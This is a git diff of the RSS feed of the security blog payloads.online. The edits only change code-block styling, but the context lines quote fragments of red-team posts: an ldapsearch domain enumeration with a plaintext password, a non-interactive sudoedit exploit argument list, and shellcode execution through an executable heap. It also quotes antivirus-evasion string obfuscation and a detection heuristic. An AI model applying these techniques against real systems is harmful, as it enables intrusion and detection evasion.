+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; _PEB {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; BYTE Reserved1[&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;];
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; BYTE BeingDebugged;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; BYTE Reserved2[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;];
@@ -1468,7 +1468,7 @@ Start:
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在Windbg中可以直观的看到PEB字段的详细信息：&lt;/p&gt;</description></item><item><title>MASM中VirtualProtect函数的分析</title><link>https://payloads.online/archivers/2021-09-03/1/</link><pubDate>Fri, 03 Sep 2021 10:10:08 +0800</pubDate><guid>https://payloads.online/archivers/2021-09-03/1/</guid><description>&lt;h2 id="0x00-调用约定"&gt;0x00 调用约定&lt;/h2&gt;
 &lt;p&gt;&lt;a href="https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-160"&gt;__stdcall&lt;/a&gt;关键字用于约定调用Win32 API函数的参数入栈顺序，它的入栈顺序是由右向左，一般C/C++语言代码中没有声明调用约定的话，默认就是&lt;code&gt;__stdcall&lt;/code&gt;调用约定。&lt;/p&gt;
 &lt;p&gt;C++中如果要声明函数的调用约定，可以通过以下格式：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-C++" data-lang="C++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;__stdcall&lt;/span&gt; CMyClass&lt;span style="color:#f92672"&gt;::&lt;/span&gt;mymethod() { 
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-C++" data-lang="C++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;__stdcall&lt;/span&gt; CMyClass&lt;span style="color:#f92672"&gt;::&lt;/span&gt;mymethod() { 
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt;; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x01-栈与调用约定的关系"&gt;0x01 栈与调用约定的关系&lt;/h2&gt;
@@ -1546,7 +1546,7 @@ pop ebx ; ebx = 10h
 &lt;/p&gt;
 &lt;h3 id="获取所有域内计算机对象"&gt;获取所有域内计算机对象&lt;/h3&gt;
 &lt;p&gt;通过ldapsearch可以跟进不同的条件去检索域内的数据，上面的表格中明确了objectCategory属性与objectClass属性组合可以获取指定对象，通过这个表格，我们尝试获取域内的所有机器:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ldapsearch -h 192.168.49.132 -b dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;domain16,dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;local -D cn&lt;span style="color:#f92672"&gt;=&lt;/span&gt;zhangsan,ou&lt;span style="color:#f92672"&gt;=&lt;/span&gt;officeuser,dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;domain16,dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;local -w San@123 objectClass&lt;span style="color:#f92672"&gt;=&lt;/span&gt;computer dn
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ldapsearch -h 192.168.49.132 -b dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;domain16,dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;local -D cn&lt;span style="color:#f92672"&gt;=&lt;/span&gt;zhangsan,ou&lt;span style="color:#f92672"&gt;=&lt;/span&gt;officeuser,dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;domain16,dc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;local -w San@123 objectClass&lt;span style="color:#f92672"&gt;=&lt;/span&gt;computer dn
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href="https://images.payloads.online/b6fdd6a0-4f5f-11ec-ba51-00d861bf4abb.png" data-fancybox="gallery" data-caption="2021-08-11-12-00-55"&gt;
  &lt;img src="https://images.payloads.online/b6fdd6a0-4f5f-11ec-ba51-00d861bf4abb.png" alt="2021-08-11-12-00-55" /&gt;
 &lt;/a&gt;
@@ -1606,7 +1606,7 @@ pop ebx ; ebx = 10h
 &lt;p&gt;&lt;a href="http://openresty.org/cn/"&gt;OpenResty®&lt;/a&gt; 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。&lt;/p&gt;
 &lt;p&gt;根据它的官方文档和&lt;a href="https://github.com/openresty/docker-openresty"&gt;开源仓库&lt;/a&gt;我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。&lt;/p&gt;
 &lt;p&gt;首先拉取镜像到本地，方便后续的操作：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker pull openresty/openresty:alpine
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker pull openresty/openresty:alpine
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="openresty配置文件"&gt;OpenResty配置文件&lt;/h3&gt;
 &lt;p&gt;OpenResty Docker环境共有两块需要关注的配置文件：&lt;/p&gt;
 &lt;ul&gt;
@@ -1640,7 +1640,7 @@ http {
 &lt;p&gt;本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。&lt;/p&gt;
 &lt;h2 id="0x02-linux-管道符"&gt;0x02 Linux 管道符&lt;/h2&gt;
 &lt;p&gt;在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &lt;span style="color:#e6db74"&gt;&amp;#34;new-pass&amp;#34;&lt;/span&gt; | passwd --stdin username
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &lt;span style="color:#e6db74"&gt;&amp;#34;new-pass&amp;#34;&lt;/span&gt; | passwd --stdin username
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
 &lt;p&gt;该命令只适用于旧版，不建议在命令行中传递明文密码&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1659,7 +1659,7 @@ int execve(const char *pathname, char *const argv[],char *const envp[]);
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;p&gt;在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;char&lt;/span&gt;&lt;span style="color:#f92672"&gt;*&lt;/span&gt; sudoedit_argv[] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;char&lt;/span&gt;&lt;span style="color:#f92672"&gt;*&lt;/span&gt; sudoedit_argv[] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;sudoedit&amp;#34;&lt;/span&gt;,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;-S&amp;#34;&lt;/span&gt;, &lt;span style="color:#75715e"&gt;// --stdin 非交互式
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;-s&amp;#34;&lt;/span&gt;,
@@ -1691,7 +1691,7 @@ int execve(const char *pathname, char *const argv[],char *const envp[]);
 &lt;h2 id="0x01-uuid"&gt;0x01 UUID&lt;/h2&gt;
 &lt;p&gt;通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 — 来源：&lt;a href="https://en.wikipedia.org/wiki/Universally_unique_identifier"&gt;维基百科&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;关于Windows中的GUID也等同于UUID，先看一下结构：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_GUID&lt;/span&gt; {
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_GUID&lt;/span&gt; {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;unsigned&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;long&lt;/span&gt; Data1; &lt;span style="color:#75715e"&gt;// 4字节
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;unsigned&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;short&lt;/span&gt; Data2; &lt;span style="color:#75715e"&gt;// 2字节
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;unsigned&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;short&lt;/span&gt; Data3; &lt;span style="color:#75715e"&gt;// 2字节
@@ -1699,16 +1699,16 @@ int execve(const char *pathname, char *const argv[],char *const envp[]);
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;} GUID;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总和一共16字节，16*8 = 128位。&lt;/p&gt;
 &lt;h2 id="0x02-与uuid相关的windows-api"&gt;0x02 与UUID相关的Windows API&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RPC_STATUS &lt;span style="color:#a6e22e"&gt;UuidFromString&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RPC_STATUS &lt;span style="color:#a6e22e"&gt;UuidFromString&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; RPC_CSTR StringUuid,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; UUID &lt;span style="color:#f92672"&gt;*&lt;/span&gt;Uuid
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;功能：将字符串UUID转换为UUID结构。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RPC_STATUS &lt;span style="color:#a6e22e"&gt;UuidCreate&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RPC_STATUS &lt;span style="color:#a6e22e"&gt;UuidCreate&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; UUID &lt;span style="color:#f92672"&gt;*&lt;/span&gt;Uuid
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;功能：创建UUID结构。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UuidEqual&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UuidEqual&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; UUID &lt;span style="color:#f92672"&gt;*&lt;/span&gt;Uuid1,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; UUID &lt;span style="color:#f92672"&gt;*&lt;/span&gt;Uuid2,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; RPC_STATUS &lt;span style="color:#f92672"&gt;*&lt;/span&gt;Status
@@ -1760,7 +1760,7 @@ ntdll!_SECURITY_DESCRIPTOR
 &lt;h2 id="0x03-举一反三"&gt;0x03 举一反三&lt;/h2&gt;
 &lt;p&gt;由此说来，Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;HeapCreate&lt;/code&gt;可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HANDLE WINAPI &lt;span style="color:#a6e22e"&gt;HeapCreate&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HANDLE WINAPI &lt;span style="color:#a6e22e"&gt;HeapCreate&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;__in DWORD flOptions,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;__in SIZE_T dwInitialSize,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;__in SIZE_T dwMaximumSize );
@@ -1773,7 +1773,7 @@ ntdll!_SECURITY_DESCRIPTOR
 &lt;/ul&gt;
 &lt;p&gt;看到&lt;code&gt;HEAP_CREATE_ENALBE_EXECUTE&lt;/code&gt;相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。&lt;/p&gt;
 &lt;h2 id="0x04-shellcode执行"&gt;0x04 Shellcode执行&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;()
@@ -1795,7 +1795,7 @@ ntdll!_SECURITY_DESCRIPTOR
 &lt;h2 id="0x01-字符串"&gt;0x01 字符串&lt;/h2&gt;
 &lt;p&gt;一般情况下，C/C++程序中的字符串常量会被硬编码到程序中（.data段，也就是数据段），尤其是全局变量最容易被定位到。&lt;/p&gt;
 &lt;p&gt;例如：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;char&lt;/span&gt; global_string[] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -1824,7 +1824,7 @@ lcx -&amp;lt;listen|tran|slave&amp;gt; &amp;lt;option&amp;gt; [-log logfile]
 &lt;p&gt;这里需要使用重载运算符来方便我们编程：
 重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。&lt;/p&gt;
 &lt;p&gt;简单的例子如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#pragma once
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#pragma once
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
@@ -1841,7 +1841,7 @@ lcx -&amp;lt;listen|tran|slave&amp;gt; &amp;lt;option&amp;gt; [-log logfile]
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#f92672"&gt;~&lt;/span&gt;BadString();
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;};
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;#34;BadString.h&amp;#34;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;#34;BadString.h&amp;#34;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;std&lt;span style="color:#f92672"&gt;::&lt;/span&gt;string BadString&lt;span style="color:#f92672"&gt;::&lt;/span&gt;Base64decode(std&lt;span style="color:#f92672"&gt;::&lt;/span&gt;string szBase64String, LPDWORD lpdwLen)
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
@@ -1967,7 +1967,7 @@ note right: 倾旋的博客:https://payloads.online
 &lt;p&gt;方法论：&lt;/p&gt;
 &lt;p&gt;如果一个文件的文件大小在300KB以内，并且导入函数又有&lt;code&gt;Virtual Alloc&lt;/code&gt;、&lt;code&gt;CreateThread&lt;/code&gt;，且&lt;code&gt;VirtualAlloc&lt;/code&gt;的最后一个参数是&lt;code&gt;0x40&lt;/code&gt;，那么此文件是高危文件。&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;0x40&lt;/code&gt;被定义在&lt;code&gt;winnt.h&lt;/code&gt;中：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#define PAGE_NOACCESS 0x01 
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#define PAGE_NOACCESS 0x01 
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#define PAGE_READONLY 0x02 
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#define PAGE_READWRITE 0x04 
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#define PAGE_WRITECOPY 0x08 
@@ -1984,7 +1984,7 @@ note right: 倾旋的博客:https://payloads.online
 &lt;h2 id="0x02-getprocaddress获取函数地址"&gt;0x02 GetProcAddress获取函数地址&lt;/h2&gt;
 &lt;p&gt;&lt;code&gt;GetProcAddress&lt;/code&gt;这个API在Kernel32.dll中被导出，主要功能是从一个加载的模块中获取函数的地址。&lt;/p&gt;
 &lt;p&gt;函数声明如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;FARPROC &lt;span style="color:#a6e22e"&gt;GetProcAddress&lt;/span&gt;(
